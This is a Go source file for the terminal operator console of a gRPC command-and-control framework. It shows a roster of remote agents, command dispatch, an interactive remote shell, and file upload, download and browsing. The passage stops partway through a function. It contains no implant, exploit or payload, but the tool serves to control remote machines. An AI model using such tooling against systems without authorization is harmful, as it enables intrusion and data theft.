package main

import (
	"context"
	"encoding/json"
	"flag"
	"fmt"
	"log"
	"net"
	"os"
	"sort"
	"strconv"
	"strings"
	"sync"
	"time"
	"unicode"

	pb "github.com/ardhptr21/c2-grpc/pb"
	"github.com/charmbracelet/bubbles/textinput"
	"github.com/charmbracelet/bubbles/viewport"
	tea "github.com/charmbracelet/bubbletea"
	"github.com/charmbracelet/lipgloss"
	"github.com/charmbracelet/x/ansi"
)

type agentRow struct {
	ID      string
	Summary string
	Status  string
}

type operatorEventMsg struct {
	event *pb.OperatorEvent
}

type operatorConnectedMsg struct {
	stream        pb.OperatorService_ConnectClient
	historyClient pb.HistoryServiceClient
	shellStream   pb.ShellService_OperatorShellClient
	fileStream    pb.FileService_OperatorTransferClient
}

type operatorDisconnectedMsg struct {
	message string
}

type historyLoadedMsg struct {
	agentID string
	entries []*pb.AgentHistoryEntry
}

type historyErrorMsg struct {
	message string
}

type shellEventMsg struct {
	event *pb.AgentShellEvent
}

type fileEventMsg struct {
	event *pb.AgentFileEvent
}

type activeDownload struct {
	localPath     string
	remotePath    string
	file          *os.File
	totalBytes    int64
	receivedBytes int64
}

type activeUpload struct {
	localPath        string
	remotePath       string
	totalBytes       int64
	transferredBytes int64
}

type remoteFileEntry struct {
	Name       string
	Path       string
	IsDir      bool
	Size       int64
	ModifiedAt int64
}

type operatorModel struct {
	stream                pb.OperatorService_ConnectClient
	historyClient         pb.HistoryServiceClient
	shellStream           pb.ShellService_OperatorShellClient
	fileStream            pb.FileService_OperatorTransferClient
	events                chan tea.Msg
	commandInput          textinput.Model
	fileInput             textinput.Model
	logViewport           viewport.Model
	historyListViewport   viewport.Model
	historyDetailViewport viewport.Model
	shellViewport         viewport.Model
	fileBrowserViewport   viewport.Model
	fileViewport          viewport.Model
	screen                string
	activeTab             string
	logContent            string
	fileLog               string
	fileAgentID           string
	fileBrowserPath       string
	fileEntries           []remoteFileEntry
	fileListTransferID    string
	agents                map[string]agentRow
	agentOrder            []string
	selected              int
	historyCache          map[string][]*pb.AgentHistoryEntry
	historyEntries        []*pb.AgentHistoryEntry
	historySelected       int
	historyAgentID        string
	shellSessionID        string
	shellAgentID          string
	shellOutput           string
	shellReady            bool
	shellInputBuffer      string
	shellPendingEcho      string
	shellSkipEchoNewline  bool
	fileCurrentDirs       map[string]string
	fileDownloads         map[string]*activeDownload
	fileUploads           map[string]*activeUpload
	fileSendMu            *sync.Mutex
	width                 int
	height                int
	status                string
}

type layoutDimensions struct {
	availableWidth    int
	leftPaneWidth     int
	rightPaneWidth    int
	paneContentHeight int
	logViewportWidth  int
	logViewportHeight int
}

var (
	appStyle   = lipgloss.NewStyle().Padding(1, 2)
	titleStyle = lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("86"))
	panelStyle = lipgloss.NewStyle().Border(lipgloss.RoundedBorder()).BorderForeground(lipgloss.Color("62")).Padding(0, 1)
	mutedStyle = lipgloss.NewStyle().Foreground(lipgloss.Color("243"))
	activeRow  = lipgloss.NewStyle().Foreground(lipgloss.Color("229")).Background(lipgloss.Color("62")).Padding(0, 1)
	deadRow    = lipgloss.NewStyle().Foreground(lipgloss.Color("203"))
)

const landingASCII = `
  ____ ____         ____ _ __ ____   ___
 / ___|___ \       / ___| |\ |  _ \ / __|
| |     __) |_____| |  _| | \| |_) | |
| |___ / __/|_____| |_| | | |\  __/| |__
 \____|_____|      \____|_| |_|    \___|
`

func main() {
	host := flag.String("host", "localhost", "gRPC server host")
	port := flag.Int("port", 50051, "gRPC server port")
	serverAddr := flag.String("server", "", "deprecated: gRPC server address")
	flag.Parse()

	targetAddr := net.JoinHostPort(*host, strconv.Itoa(*port))
	if strings.TrimSpace(*serverAddr) != "" {
		targetAddr = *serverAddr
	}

	ctx, cancel := context.WithCancel(context.Background())
	defer cancel()

	m := newOperatorModel()
	go maintainOperatorConnection(ctx, targetAddr, m.events)

	p := tea.NewProgram(m, tea.WithAltScreen(), tea.WithMouseCellMotion())
	if _, err := p.Run(); err != nil {
		log.Fatalf("operator ui error: %v", err)
	}
}

func newOperatorModel() operatorModel {
	input := textinput.New()
	input.Placeholder = "Type a command, e.g. ls, whoami, or sysinfo"
	input.Focus()
	input.CharLimit = 256
	input.Prompt = "cmd> "

	fileInput := textinput.New()
	fileInput.Placeholder = `upload "/local path/file" "/remote path/" or download '/remote path/file' "./local dir/"`
	fileInput.Focus()
	fileInput.CharLimit = 512
	fileInput.Prompt = "file> "

	vp := viewport.New(80, 20)
	vp.SetContent("Waiting for operator events...")
	historyList := viewport.New(40, 20)
	historyDetail := viewport.New(80, 20)
	shellView := viewport.New(80, 20)
	fileBrowser := viewport.New(80, 10)
	fileView := viewport.New(80, 20)
	fileBrowser.SetContent("No directory loaded.")
	fileView.SetContent("No file transfer activity yet.")

	return operatorModel{
		events:                make(chan tea.Msg, 64),
		commandInput:          input,
		fileInput:             fileInput,
		logViewport:           vp,
		historyListViewport:   historyList,
		historyDetailViewport: historyDetail,
		shellViewport:         shellView,
		fileBrowserViewport:   fileBrowser,
		fileViewport:          fileView,
		screen:                "landing",
		activeTab:             "live",
		agents:                make(map[string]agentRow),
		historyCache:          make(map[string][]*pb.AgentHistoryEntry),
		fileCurrentDirs:       make(map[string]string),
		fileDownloads:         make(map[string]*activeDownload),
		fileUploads:           make(map[string]*activeUpload),
		fileSendMu:            &sync.Mutex{},
		fileBrowserPath:       ".",
		status:                "Connecting to server...",
	}
}

func (m operatorModel) Init() tea.Cmd {
	return tea.Batch(textinput.Blink, waitForOperatorEvent(m.events))
}

func waitForOperatorEvent(ch <-chan tea.Msg) tea.Cmd {
	return func() tea.Msg {
		msg, ok := <-ch
		if !ok {
			return operatorDisconnectedMsg{}
		}
		return msg
	}
}

func (m operatorModel) Update(msg tea.Msg) (tea.Model, tea.Cmd) {
	switch msg := msg.(type) {
	case tea.WindowSizeMsg:
		m.width = msg.Width
		m.height = msg.Height
		m.resize()
		return m, nil
	case operatorEventMsg:
		cmd := m.applyEvent(msg.event)
		m.refreshLogs()
		return m, tea.Batch(waitForOperatorEvent(m.events), cmd)
	case operatorConnectedMsg:
		m.stream = msg.stream
		m.historyClient = msg.historyClient
		m.shellStream = msg.shellStream
		m.fileStream = msg.fileStream
		m.status = "Connected. Use ↑/↓ to pick an agent and Enter to dispatch."
		return m, waitForOperatorEvent(m.events)
	case operatorDisconnectedMsg:
		m.stream = nil
		m.historyClient = nil
		m.shellStream = nil
		m.fileStream = nil
		m.agents = make(map[string]agentRow)
		m.agentOrder = nil
		m.selected = 0
		m.shellSessionID = ""
		m.shellAgentID = ""
		m.shellOutput = ""
		m.shellReady = false
		m.shellInputBuffer = ""
		m.shellPendingEcho = ""
		m.shellSkipEchoNewline = false
		m.fileLog = ""
		m.fileAgentID = ""
		m.fileBrowserPath = "."
		m.fileEntries = nil
		m.fileListTransferID = ""
		m.fileViewport.SetContent("No file transfer activity yet.")
		m.fileBrowserViewport.SetContent("No directory loaded.")
		m.closeDownloadFiles()
		m.fileDownloads = make(map[string]*activeDownload)
		m.fileUploads = make(map[string]*activeUpload)
		if msg.message != "" {
			m.status = msg.message
		} else {
			m.status = "Disconnected from server. Reconnecting..."
		}
		if m.activeTab == "history" {
			m.refreshHistoryViewports()
		}
		return m, waitForOperatorEvent(m.events)
	case historyLoadedMsg:
		m.historyAgentID = msg.agentID
		m.historyCache[msg.agentID] = cloneHistoryEntries(msg.entries)
		m.historyEntries = msg.entries
		m.historySelected = 0
		m.activeTab = "history"
		m.refreshHistoryViewports()
		if len(msg.entries) == 0 {
			m.status = "No saved history for the selected agent."
		} else {
			m.status = fmt.Sprintf("Loaded %d history entries for agent:%s", len(msg.entries), shortAgentID(msg.agentID))
		}
		return m, nil
	case historyErrorMsg:
		m.status = msg.message
		return m, nil
	case shellEventMsg:
		m.applyShellEvent(msg.event)
		return m, waitForOperatorEvent(m.events)
	case fileEventMsg:
		m.applyFileEvent(msg.event)
		return m, waitForOperatorEvent(m.events)
	case tea.KeyMsg:
		switch msg.String() {
		case "ctrl+c", "q":
			if m.stream != nil {
				_ = m.stream.CloseSend()
			}
			if m.shellStream != nil {
				_ = m.shellStream.CloseSend()
			}
			if m.fileStream != nil {
				_ = m.fileStream.CloseSend()
			}
			m.closeDownloadFiles()
			m.fileUploads = make(map[string]*activeUpload)
			return m, tea.Quit
		case "enter":
			if m.screen == "landing" {
				m.screen = "operator"
				return m, nil
			}
		case "f1":
			m.activeTab = "live"
			return m, nil
		case "f2":
			if cmd := m.activateHistoryTab(); cmd != nil {
				return m, cmd
			}
			return m, nil
		case "f3":
			if cmd := m.activateShellTab(); cmd != nil {
				return m, cmd
			}
			return m, nil
		case "f4":
			if cmd := m.activateFilesTab(); cmd != nil {
				return m, cmd
			}
			return m, nil
		}

		if m.screen == "landing" {
			return m, nil
		}

		if m.activeTab == "shell" {
			m.handleShellKey(msg)
			return m, nil
		}

		if m.activeTab == "files" {
			return m.handleFileTabKey(msg)
		}

		if m.activeTab == "history" {
			switch msg.String() {
			case "left":
				if m.historySelected > 0 {
					m.historySelected--
					m.refreshHistoryViewports()
				}
				return m, nil
			case "right":
				if m.historySelected < len(m.historyEntries)-1 {
					m.historySelected++
					m.refreshHistoryViewports()
				}
				return m, nil
			case "up":
				if m.historySelected > 0 {
					m.historySelected--
					m.refreshHistoryViewports()
				}
				return m, nil
			case "down":
				if m.historySelected < len(m.historyEntries)-1 {
					m.historySelected++
					m.refreshHistoryViewports()
				}
				return m, nil
			case "ctrl+u":
				m.historyDetailViewport.LineUp(10)
				return m, nil
			case "ctrl+d":
				m.historyDetailViewport.LineDown(10)
				return m, nil
			case "pgup":
				m.historyDetailViewport.HalfViewUp()
				return m, nil
			case "pgdown":
				m.historyDetailViewport.HalfViewDown()
				return m, nil
			case "home":
				m.historyDetailViewport.GotoTop()
				return m, nil
			case "end":
				m.historyDetailViewport.GotoBottom()
				return m, nil
			}
			return m, nil
		}

		switch msg.String() {
		case "pgup":
			m.logViewport.HalfViewUp()
			return m, nil
		case "pgdown":
			m.logViewport.HalfViewDown()
			return m, nil
		case "home":
			m.logViewport.GotoTop()
			return m, nil
		case "end":
			m.logViewport.GotoBottom()
			return m, nil
		case "ctrl+u":
			m.logViewport.LineUp(10)
			return m, nil
		case "ctrl+d":
			m.logViewport.LineDown(10)
			return m, nil
		case "up":
			if m.commandInput.Focused() && len(m.agentOrder) > 0 && m.selected > 0 {
				m.selected--
			} else {
				m.logViewport.LineUp(1)
			}
			return m, nil
		case "down":
			if m.commandInput.Focused() && len(m.agentOrder) > 0 && m.selected < len(m.agentOrder)-1 {
				m.selected++
			} else {
				m.logViewport.LineDown(1)
			}
			return m, nil
		case "enter":
			commandLine := strings.TrimSpace(m.commandInput.Value())
			if commandLine == "" {
				m.status = "Enter a command first."
				return m, nil
			}

			if commandLine == "clear" {
				m.logContent = ""
				m.refreshLogs()
				m.status = "Output pane cleared."
				m.commandInput.SetValue("")
				return m, nil
			}

			if len(m.agentOrder) == 0 {
				if m.stream == nil {
					m.status = "Disconnected from server. Reconnecting..."
				} else {
					m.status = "No agents connected."
				}
				return m, nil
			}

			selectedID := m.agentOrder[m.selected]
			parts := strings.Fields(commandLine)
			cmd := &pb.OperatorCommand{
				TargetAgentId: selectedID,
				Command:       parts[0],
			}
			if len(parts) > 1 {
				cmd.Args = strings.Join(parts[1:], " ")
			}

			if err := m.stream.Send(cmd); err != nil {
				m.status = fmt.Sprintf("send error: %v", err)
				return m, nil
			}

			m.status = fmt.Sprintf("Queued for agent:%s -> %s", selectedID, commandLine)
			m.commandInput.SetValue("")
			return m, nil
		}
	case tea.MouseMsg:
		if m.screen == "landing" {
			return m, nil
		}
		if m.activeTab == "history" && msg.Action == tea.MouseActionPress {
			switch msg.Button {
			case tea.MouseButtonWheelUp:
				m.historyDetailViewport.LineUp(3)
				return m, nil
			case tea.MouseButtonWheelDown:
				m.historyDetailViewport.LineDown(3)
				return m, nil
			}
		}
		if m.activeTab == "shell" && msg.Action == tea.MouseActionPress {
			switch msg.Button {
			case tea.MouseButtonWheelUp:
				m.shellViewport.LineUp(3)
				return m, nil
			case tea.MouseButtonWheelDown:
				m.shellViewport.LineDown(3)
				return m, nil
			}
		}
		if m.activeTab == "files" && msg.Action == tea.MouseActionPress {
			switch msg.Button {
			case tea.MouseButtonWheelUp:
				m.fileBrowserViewport.LineUp(3)
				return m, nil
			case tea.MouseButtonWheelDown:
				m.fileBrowserViewport.LineDown(3)
				return m, nil
			}
		}
		return m, nil
	}

	var cmd tea.Cmd
	if m.activeTab == "files" {
		m.fileInput, cmd = m.fileInput.Update(msg)
		return m, cmd
	}
	m.commandInput, cmd = m.commandInput.Update(msg)
	return m, cmd
}

func (m operatorModel) View() string {
	if m.width <= 0 || m.height <= 0 {
		return "Loading..."
	}

	if m.screen == "landing" {
		return m.renderLanding()
	}

	if m.activeTab == "history" {
		return m.renderHistory()
	}
	if m.activeTab == "shell" {
		return m.renderShell()
	}
	if m.activeTab == "files" {
		return m.renderFiles()
	}

	dims := m.layout()
	header := m.renderHeader()
	agentsPane := panelStyle.Width(dims.leftPaneWidth).Height(dims.paneContentHeight).Render(m.renderAgents())
	logPane := panelStyle.Width(dims.rightPaneWidth).Height(dims.paneContentHeight).Render(m.logViewport.View())
	footer := m.renderFooter(dims.availableWidth)

	content := appStyle.Render(lipgloss.JoinVertical(
		lipgloss.Left,
		header,
		lipgloss.JoinHorizontal(lipgloss.Top, agentsPane, logPane),
		footer,
	))

	return lipgloss.Place(m.width, m.height, lipgloss.Left, lipgloss.Top, content)
}

func (m operatorModel) renderLanding() string {
	asciiTitle := titleStyle.Render(strings.TrimPrefix(landingASCII, "\n"))
	card := panelStyle.Width(maxInt(48, m.width/2)).Render(
		asciiTitle + "\n" +
			mutedStyle.Render("Remote command operator") + "\n\n" +
			"Status: " + m.status + "\n\n" +
			"Press Enter to open the operator interface.\n" +
			"Press q to quit.",
	)

	return lipgloss.Place(m.width, m.height, lipgloss.Center, lipgloss.Center, card)
}

func (m operatorModel) renderHistory() string {
	dims := m.layout()
	header := m.renderTabbedHeader("Saved command history for the selected agent.")
	listPane := panelStyle.Width(dims.leftPaneWidth).Height(dims.paneContentHeight).Render(m.historyListViewport.View())
	detailPane := panelStyle.Width(dims.rightPaneWidth).Height(dims.paneContentHeight).Render(m.historyDetailViewport.View())
	footer := panelStyle.Width(dims.availableWidth).Render(
		"Agent: " + m.historyAgentID + "\n" +
			mutedStyle.Render("Agent label: "+shortAgentID(m.historyAgentID)) + "\n" +
			mutedStyle.Render("F1 Live, F2 History, F3 Shell, F4 Files. ↑/↓ or Left/Right select entries. Mouse wheel, PgUp/PgDn, Home/End scroll output.") + "\n" +
			m.status,
	)

	content := appStyle.Render(lipgloss.JoinVertical(
		lipgloss.Left,
		header,
		lipgloss.JoinHorizontal(lipgloss.Top, listPane, detailPane),
		footer,
	))
	return lipgloss.Place(m.width, m.height, lipgloss.Left, lipgloss.Top, content)
}

func (m operatorModel) renderShell() string {
	dims := m.layout()
	header := m.renderTabbedHeader("Persistent interactive shell session for the selected agent.")
	agentsPane := panelStyle.Width(dims.leftPaneWidth).Height(dims.paneContentHeight).Render(m.renderAgents())
	shellPane := panelStyle.Width(dims.rightPaneWidth).Height(dims.paneContentHeight).Render(m.shellViewport.View())
	footer := panelStyle.Width(dims.availableWidth).Render(
		"Shell Agent: " + shortAgentID(m.shellAgentID) + "\n" +
			"Input: " + m.renderShellInputIndicator() + "\n" +
			mutedStyle.Render("Type directly into the shell. F1 Live, F2 History, F3 Shell, F4 Files. Mouse wheel, PgUp/PgDn, Home/End scroll viewport.") + "\n" +
			m.status,
	)

	content := appStyle.Render(lipgloss.JoinVertical(
		lipgloss.Left,
		header,
		lipgloss.JoinHorizontal(lipgloss.Top, agentsPane, shellPane),
		footer,
	))
	return lipgloss.Place(m.width, m.height, lipgloss.Left, lipgloss.Top, content)
}

func (m operatorModel) renderFiles() string {
	dims := m.layout()
	header := m.renderTabbedHeader("Upload files to the selected agent or pull files back to the operator.")
	agentsPane := panelStyle.Width(dims.leftPaneWidth).Height(dims.paneContentHeight).Render(m.renderAgents())
	browserHeight := maxInt(5, dims.paneContentHeight/2)
	logHeight := maxInt(4, dims.paneContentHeight-browserHeight-1)
	browserPane := panelStyle.Width(dims.rightPaneWidth).Height(browserHeight).Render(m.fileBrowserViewport.View())
	logPane := panelStyle.Width(dims.rightPaneWidth).Height(logHeight).Render(m.fileViewport.View())
	filePane := lipgloss.JoinVertical(lipgloss.Left, browserPane, logPane)
	footer := panelStyle.Width(dims.availableWidth).Render(
		"Selected: " + m.selectedAgentLabel() + "\n" +
			"Remote CWD: " + m.currentFileDir() + "\n" +
			m.fileInput.View() + "\n" +
			mutedStyle.Render("Use `cd <remote_dir>`, `ls <remote_dir>`, `upload <local> <remote>`, or `download <remote> <local>`. PgUp/PgDn, Home/End, and mouse wheel scroll the browser. Ctrl+U/Ctrl+D scroll the transfer log.") + "\n" +
			m.status,
	)

	content := appStyle.Render(lipgloss.JoinVertical(
		lipgloss.Left,
		header,
		lipgloss.JoinHorizontal(lipgloss.Top, agentsPane, filePane),
		footer,
	))
	return lipgloss.Place(m.width, m.height, lipgloss.Left, lipgloss.Top, content)
}

func (m *operatorModel) applyEvent(event *pb.OperatorEvent) tea.Cmd {
	switch event.GetType() {
	case "agent_joined":
		status := extractStatus(event.GetPayload())
		if status == "" {
			status = "ALIVE"
		}
		m.agents[event.GetAgentId()] = agentRow{
			ID:      event.GetAgentId(),
			Summary: event.GetPayload(),
			Status:  status,
		}
		m.rebuildAgentOrder()
	case "agent_cached":
		m.agents[event.GetAgentId()] = agentRow{
			ID:      event.GetAgentId(),
			Summary: event.GetPayload(),
			Status:  "OFFLINE",
		}
		m.rebuildAgentOrder()
	case "agent_dead":
		row := m.agents[event.GetAgentId()]
		row.ID = event.GetAgentId()
		row.Summary = event.GetPayload()
		row.Status = "DEAD"
		m.agents[event.GetAgentId()] = row
		m.rebuildAgentOrder()
	case "agent_removed":
		row := m.agents[event.GetAgentId()]
		row.ID = event.GetAgentId()
		if strings.TrimSpace(row.Summary) == "" {
			row.Summary = event.GetPayload()
		}
		if strings.TrimSpace(row.Summary) == "" {
			row.Summary = "OFFLINE"
		}
		row.Status = "OFFLINE"
		m.agents[event.GetAgentId()] = row
		m.rebuildAgentOrder()
	case "history_updated":
		var entry pb.AgentHistoryEntry
		if err := json.Unmarshal([]byte(event.GetPayload()), &entry); err == nil {
			m.upsertHistoryEntry(event.GetAgentId(), &entry)
			if m.activeTab == "history" && m.historyAgentID == event.GetAgentId() {
				m.historyEntries = cloneHistoryEntries(m.historyCache[event.GetAgentId()])
				m.refreshHistoryViewports()
			}
		}
	}

	m.appendEvent(event)
	return nil
}

func (m *operatorModel) rebuildAgentOrder() {
	m.agentOrder = m.agentOrder[:0]
	seen := make(map[string]struct{})
	for id := range m.agents {
		m.agentOrder = append(m.agentOrder, id)
		seen[id] = struct{}{}
	}
	for id, entries := range m.historyCache {
		if len(entries) == 0 {
			continue
		}
		if _, ok := seen[id]; ok {
			continue
		}
		m.agentOrder = append(m.agentOrder, id)
	}
	sort.Slice(m.agentOrder, func(i, j int) bool {
		leftStatus := m.agentStatusForID(m.agentOrder[i])
		rightStatus := m.agentStatusForID(m.agentOrder[j])
		leftRank := agentStatusRank(leftStatus)
		rightRank := agentStatusRank(rightStatus)
		if leftRank != rightRank {
			return leftRank < rightRank
		}
		return m.agentOrder[i] < m.agentOrder[j]
	})
	if m.selected >= len(m.agentOrder) && len(m.agentOrder) > 0 {
		m.selected = len(m.agentOrder) - 1
	}
	if len(m.agentOrder) == 0 {
		m.selected = 0
	}
}

func (m *operatorModel) agentStatusForID(agentID string) string {
	agent, ok := m.agents[agentID]
	if !ok {
		return "OFFLINE"
	}
	return agent.Status
}

func agentStatusRank(status string) int {
	switch status {
	case "ALIVE", "IDLE", "BUSY":
		return 0
	case "DEAD":
		return 1
	case "OFFLINE":
		return 2
	default:
		return 3
	}
}

func (m *operatorModel) refreshLogs() {
	m.logViewport.SetContent(m.logContent)
	m.logViewport.GotoBottom()
}

func (m *operatorModel) resize() {
	dims := m.layout()
	m.logViewport.Width = dims.logViewportWidth
	m.logViewport.Height = dims.logViewportHeight
	m.historyListViewport.Width = dims.leftPaneWidth
	m.historyListViewport.Height = dims.paneContentHeight
	m.historyDetailViewport.Width = dims.logViewportWidth
	m.historyDetailViewport.Height = dims.logViewportHeight
	m.shellViewport.Width = dims.logViewportWidth
	m.shellViewport.Height = dims.logViewportHeight
	m.fileBrowserViewport.Width = dims.logViewportWidth
	m.fileBrowserViewport.Height = maxInt(5, dims.logViewportHeight/2)
	m.fileViewport.Width = dims.logViewportWidth
	m.fileViewport.Height = maxInt(4, dims.logViewportHeight-m.fileBrowserViewport.Height-1)
	m.refreshHistoryViewports()
	m.refreshShellViewport()
	m.refreshFileBrowserViewport()
	m.refreshFileViewport()
	m.resizeShell()
}

func (m operatorModel) layout() layoutDimensions {
	appHorizontalFrame, appVerticalFrame := appStyle.GetFrameSize()
	panelHorizontalFrame, panelVerticalFrame := panelStyle.GetFrameSize()

	availableWidth := maxInt(40, m.width-appHorizontalFrame)
	leftPaneWidth := maxInt(28, availableWidth/3)
	rightPaneWidth := maxInt(48, availableWidth-leftPaneWidth)

	header := m.renderHeader()
	footer := m.renderFooter(availableWidth)
	contentRowHeight := maxInt(1, m.height-appVerticalFrame-lipgloss.Height(header)-lipgloss.Height(footer))

	return layoutDimensions{
		availableWidth:    availableWidth,
		leftPaneWidth:     maxInt(1, leftPaneWidth-panelHorizontalFrame),
		rightPaneWidth:    maxInt(1, rightPaneWidth-panelHorizontalFrame),
		paneContentHeight: maxInt(1, contentRowHeight-panelVerticalFrame),
		logViewportWidth:  maxInt(1, rightPaneWidth-panelHorizontalFrame),
		logViewportHeight: maxInt(1, contentRowHeight-panelVerticalFrame),
	}
}

func (m operatorModel) renderHeader() string {
	return m.renderTabbedHeader("Live command execution with a remote agent roster.")
}

func (m operatorModel) renderTabbedHeader(subtitle string) string {
	tabActive := lipgloss.NewStyle().Bold(true).Foreground(lipgloss.Color("229")).Background(lipgloss.Color("62")).Padding(0, 1)
	tabIdle := lipgloss.NewStyle().Foreground(lipgloss.Color("245")).Padding(0, 1)

	liveTab := tabIdle.Render("Live")
	historyTab := tabIdle.Render("History")
	shellTab := tabIdle.Render("Shell")
	fileTab := tabIdle.Render("Files")
	if m.activeTab == "live" {
		liveTab = tabActive.Render("Live")
	} else if m.activeTab == "history" {
		historyTab = tabActive.Render("History")
	} else if m.activeTab == "shell" {
		shellTab = tabActive.Render("Shell")
	} else {
		fileTab = tabActive.Render("Files")
	}

	return titleStyle.Render("C2-GRPC OPERATOR") + "\n" +
		lipgloss.JoinHorizontal(lipgloss.Left, liveTab, " ", historyTab, " ", shellTab, " ", fileTab) + "\n" +
		mutedStyle.Render(subtitle)
}

func (m operatorModel) renderFooter(width int) string {
	return panelStyle.Width(width).Render(
		"Selected: " + m.selectedAgentLabel() + "\n" +
			m.commandInput.View() + "\n" +
			mutedStyle.Render("Enter dispatches. F1 Live, F2 History, F3 Shell, F4 Files. ↑/↓ select agents. PgUp/PgDn, Home/End, Ctrl+U/Ctrl+D scroll output. q quits.") + "\n" +
			m.status,
	)
}

func (m operatorModel) renderAgents() string {
	if len(m.agentOrder) == 0 {
		return "Agents\n\nNo agents connected.\nNo cached agents."
	}

	rows := make([]string, 0, len(m.agentOrder)+2)
	rows = append(rows, "Agents", "")
	for i, id := range m.agentOrder {
		agent, ok := m.agents[id]
		if !ok {
			agent = agentRow{
				ID:      id,
				Summary: "OFFLINE",
				Status:  "OFFLINE",
			}
		}
		summary := agent.Summary
		if agent.Status == "OFFLINE" {
			summary = renderOfflineSummary(summary)
		}
		row := fmt.Sprintf("%s  %s", shortAgentID(id), summary)
		if agent.Status == "DEAD" || agent.Status == "OFFLINE" {
			row = deadRow.Render(row)
		}
		if i == m.selected {
			row = activeRow.Render(row)
		}
		rows = append(rows, row)
	}
	return strings.Join(rows, "\n")
}

func (m operatorModel) selectedAgentLabel() string {
	if len(m.agentOrder) == 0 {
		return "none"
	}
	return "agent:" + shortAgentID(m.agentOrder[m.selected])
}

func formatEvent(event *pb.OperatorEvent) string {
	switch event.GetType() {
	case "agent_joined":
		return fmt.Sprintf("[+] agent:%s  %s", shortAgentID(event.GetAgentId()), event.GetPayload())
	case "agent_dead":
		return fmt.Sprintf("[!] agent:%s  %s", shortAgentID(event.GetAgentId()), event.GetPayload())
	case "agent_removed":
		return fmt.Sprintf("[-] agent:%s  %s", shortAgentID(event.GetAgentId()), event.GetPayload())
	case "agent_cached":
		return fmt.Sprintf("[.] agent:%s  %s", shortAgentID(event.GetAgentId()), event.GetPayload())
	case "history_updated":
		return ""
	case "output":
		return event.GetPayload()
	case "ack":
		return fmt.Sprintf("[~] agent:%s  %s", shortAgentID(event.GetAgentId()), event.GetPayload())
	case "error":
		return fmt.Sprintf("[x] agent:%s  %s", shortAgentID(event.GetAgentId()), event.GetPayload())
	default:
		return fmt.Sprintf("[?] %s agent:%s  %s", event.GetType(), shortAgentID(event.GetAgentId()), event.GetPayload())
	}
}

func sanitizeOutput(s string) string {
	s = strings.ReplaceAll(s, "\r\n", "\n")
	s = strings.ReplaceAll(s, "\r", "\n")
	s = ansi.Strip(s)

	return strings.Map(func(r rune) rune {
		if r == '\n' || r == '\t' {
			return r
		}
		if unicode.IsControl(r) {
			return -1
		}
		return r
	}, s)
}

func sanitizeShellOutput(s string) string {
	s = strings.ReplaceAll(s, "\r\n", "\n")
	s = ansi.Strip(s)

	var out []rune
	for _, r := range s {
		switch r {
		case '\r':
			continue
		case '\n', '\t':
			out = append(out, r)
		case '\b', 0x7f:
			out = append(out, r)
		default:
			if unicode.IsControl(r) {
				continue
			}
			out = append(out, r)
		}
	}
	return string(out)
}

func (m *operatorModel) appendShellOutput(chunk string) {
	chunk = sanitizeShellOutput(chunk)
	chunk = m.consumePendingShellEcho(chunk)
	if chunk == "" {
		return
	}

	out := []rune(m.shellOutput)
	for _, r := range chunk {
		switch r {
		case '\b', 0x7f:
			if len(out) > 0 && out[len(out)-1] != '\n' {
				out = out[:len(out)-1]
			}
		default:
			out = append(out, r)
		}
	}
	m.shellOutput = string(out)
}

func (m *operatorModel) consumePendingShellEcho(chunk string) string {
	if chunk == "" {
		return chunk
	}

	runes := []rune(chunk)
	for len(runes) > 0 {
		if m.shellPendingEcho != "" {
			pending := []rune(m.shellPendingEcho)
			if runes[0] == pending[0] {
				runes = runes[1:]
				m.shellPendingEcho = string(pending[1:])
				if m.shellPendingEcho == "" {
					m.shellSkipEchoNewline = true
				}
				continue
			}
			if idx := strings.Index(string(runes), m.shellPendingEcho); idx >= 0 {
				trimmed := string(runes[:idx]) + string(runes[idx+len(m.shellPendingEcho):])
				runes = []rune(trimmed)
				m.shellPendingEcho = ""
				m.shellSkipEchoNewline = true
				continue
			}
			m.shellPendingEcho = ""
		}
		if m.shellSkipEchoNewline {
			if runes[0] == '\n' {
				runes = runes[1:]
			}
			m.shellSkipEchoNewline = false
			continue
		}
		break
	}

	return string(runes)
}

func (m *operatorModel) appendEvent(event *pb.OperatorEvent) {
	entry := formatEvent(event)
	if entry == "" {
		return
	}

	if event.GetType() == "output" {
		m.logContent += sanitizeOutput(entry)
	} else {
		if m.logContent != "" && !strings.HasSuffix(m.logContent, "\n") {
			m.logContent += "\n"
		}
		m.logContent += entry + "\n"
	}

	const maxLogBytes = 64 * 1024
	if len(m.logContent) > maxLogBytes {
		m.logContent = m.logContent[len(m.logContent)-maxLogBytes:]
	}
}

func (m *operatorModel) appendFileLog(line string) {
	if line == "" {
		return
	}
	if m.fileLog != "" && !strings.HasSuffix(m.fileLog, "\n") {
		m.fileLog += "\n"
	}
	m.fileLog += line + "\n"

	const maxFileLogBytes = 64 * 1024
	if len(m.fileLog) > maxFileLogBytes {
		m.fileLog = m.fileLog[len(m.fileLog)-maxFileLogBytes:]
	}
}

func (m *operatorModel) refreshHistoryViewports() {
	rows := make([]string, 0, len(m.historyEntries)+2)
	rows = append(rows, "History", "")
	for i, entry := range m.historyEntries {
		timestamp := formatMillis(entry.GetExecutedAt())
		commandWidth := maxInt(1, m.historyListViewport.Width-lipgloss.Width(timestamp)-2)
		label := fmt.Sprintf("%s  %s", timestamp, trimToWidth(renderCommand(entry), commandWidth))
		if i == m.historySelected {
			label = activeRow.Render(label)
		}
		rows = append(rows, label)
	}
	if len(m.historyEntries) == 0 {
		rows = append(rows, "No saved history.")
	}
	m.historyListViewport.SetContent(strings.Join(rows, "\n"))
	m.ensureHistorySelectionVisible()

	if len(m.historyEntries) == 0 {
		m.historyDetailViewport.SetContent("No saved command history for this agent.")
		return
	}

	entry := m.historyEntries[m.historySelected]
	detail := strings.Join([]string{
		"Task ID: " + entry.GetTaskId(),
		"Executed: " + formatMillis(entry.GetExecutedAt()),
		"Completed: " + formatMillis(entry.GetCompletedAt()),
		"Command: " + renderCommand(entry),
		"",
		"Output:",
		"",
		entry.GetOutput(),
	}, "\n")
	m.historyDetailViewport.SetContent(detail)
	m.historyDetailViewport.GotoTop()
}

func (m *operatorModel) activateHistoryTab() tea.Cmd {
	m.activeTab = "history"
	if len(m.agentOrder) == 0 {
		if agentID, ok := m.cachedHistoryAgentID(); ok {
			m.historyAgentID = agentID
			m.historyEntries = cloneHistoryEntries(m.historyCache[agentID])
			m.historySelected = 0
			m.refreshHistoryViewports()
			m.status = fmt.Sprintf("Showing saved history for offline agent:%s", shortAgentID(agentID))
			return nil
		}
		m.status = "No saved history available."
		return nil
	}

	agentID := m.agentOrder[m.selected]
	if cached, ok := m.historyCache[agentID]; ok {
		m.historyAgentID = agentID
